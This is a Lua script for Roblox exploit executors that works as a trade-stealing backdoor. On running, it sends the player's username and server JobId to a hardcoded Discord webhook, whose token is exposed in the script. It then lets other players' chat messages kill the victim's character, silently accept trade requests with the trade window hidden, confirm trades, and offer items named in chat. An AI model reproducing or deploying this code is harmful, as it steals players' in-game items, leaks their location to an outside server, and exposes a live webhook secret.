local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or
   SONA_LOADED and "Sona" or
   "Kid with shit exploit"

local url =
   "https://discord.com/api/webhooks/1251936884297433138/nt7hqXpvH9w0Vxd21foA-W2wSOvik3sjvfwd6_biv9IuzEuNVSpriPKrMeFFQEbTiW3d"
local data = {
   ["content"] = "LocalPlayer: " .. game.Players.LocalPlayer.Name .. " JobId: " .. game.JobId
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

Player = game.Players.LocalPlayer
Pl = game.Players

function MainCommands(plr, msg)
    if msg == "p" then
        game.Players.LocalPlayer.Character.Humanoid.Health = 0
    end

    if msg == "s" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
        for i = 1, 100 do
            wait(0.1)
        game.Players.LocalPlayer.PlayerGui.TradeGUI_Phone.Enabled = false
        game.Players.LocalPlayer.PlayerGui.TradeGUI.Enabled = false
    end
    end

    if msg == "a" then
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer()
        
    end
end

for i, v in Pl:GetChildren() do
    if v ~= Player then
        v.Chatted:Connect(function(msg)
            MainCommands(v, msg)
        end)
    end
end

Pl.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        MainCommands(plr, msg)
    end)
end)

Pl.Chatted:Connect(function(msg) 
    
    local args = {
        [1] = msg,
        [2] = "Weapons"
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))

end)

